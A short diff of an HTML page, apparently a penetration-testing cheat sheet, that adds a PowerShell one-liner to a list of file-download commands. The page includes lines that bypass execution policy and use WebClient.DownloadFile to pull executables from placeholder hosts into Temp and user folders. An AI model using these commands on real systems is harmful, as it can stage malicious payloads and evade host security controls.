@@ -18,4 +18,6 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 <br/>
 Alternative System.Net.WebClient one-liner<br/>
 (New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") <br/>
-</body></html>
+<br/>
+<br/>
+powershell -nop -c "(New-Object System.Net.WebClient).DownloadFile('http://web/file.exe','C:\users\you\file.exe')"</body></html>
